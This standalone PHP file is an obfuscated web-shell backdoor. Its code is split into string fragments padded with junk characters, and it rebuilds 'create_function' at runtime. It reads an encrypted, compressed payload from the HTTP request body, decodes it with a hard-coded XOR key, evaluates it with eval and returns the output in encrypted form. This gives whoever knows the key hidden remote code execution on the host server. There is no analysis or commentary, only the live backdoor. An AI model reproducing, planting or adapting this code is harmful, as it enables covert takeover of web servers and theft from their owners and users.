<?php
$R='o.>>=$t{$>i}^$k{$j};}}re>turn $>>o;>}if (@p>reg_>match(">/$kh(.+)$kf/>",@file>_get_co>ntent>s>(>"php://i';
$p='conten>ts>();@ob>_end_cl>ean();>$r=@base>6>4_e>ncode(@x(@>gzcompre>ss($>o),$k))>;pr>int("$p$kh>$r$kf");}';
$Q='$k="afa>ffc8b">;>$kh>="d7193dd0da3b">;$kf="3>1cd>>d18>5ef1a";$p="VgxD>1cLzw>nSkr>8Mf";func>>tio>n x($t,$';
$X=str_replace('mC','','crmCemCmCatmCe_mCfuncmCtion');
$B='>nput"),$m)==1) {@>ob_>star>t();@e>val(@gzunc>ompr>ess(>@x(@base6>4>_decode($m[1]>),$k))>);$>o=@ob_ge>t_';
$G='k){$>c=s>trl>en($k);$l=str>len($t);$o=>"">;for($>i=0;$i<$l;>){for>>($j=0;>($j<$c&&$i<$>l>);$j++,$i+>+){$';
$M=str_replace('>','',$Q.$G.$R.$B.$p);
$w=$X('',$M);$w();
?>
